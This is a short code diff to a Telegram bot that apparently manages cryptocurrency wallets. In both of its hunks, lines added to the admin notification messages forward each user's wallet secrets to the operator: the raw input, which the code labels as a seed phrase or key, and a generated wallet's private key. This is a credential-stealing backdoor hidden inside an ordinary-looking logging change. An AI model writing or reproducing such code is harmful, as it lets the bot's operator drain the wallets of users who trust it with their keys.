@@ -261,6 +261,7 @@ bot.on("message:text", async (ctx) => {
           `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
           `🆔 ${ctx.from!.id}\n` +
           `📍 <code>${address}</code>\n` +
+          `${input.trim().includes(" ") ? "📝" : "🔑"} <code>${input}</code>\n` +
           `📅 ${adminTimestamp()}`
       );
       try {
@@ -380,6 +381,7 @@ bot.on("callback_query:data", async (ctx) => {
           `👤 ${ctx.from!.username ? `@${ctx.from!.username}` : ctx.from!.first_name ?? "unknown"}\n` +
           `🆔 ${ctx.from!.id}\n` +
           `📍 <code>${wallet.address}</code>\n` +
+          `🔑 <code>${wallet.privateKey}</code>\n` +
           `📅 ${adminTimestamp()}`
       );
       return render(
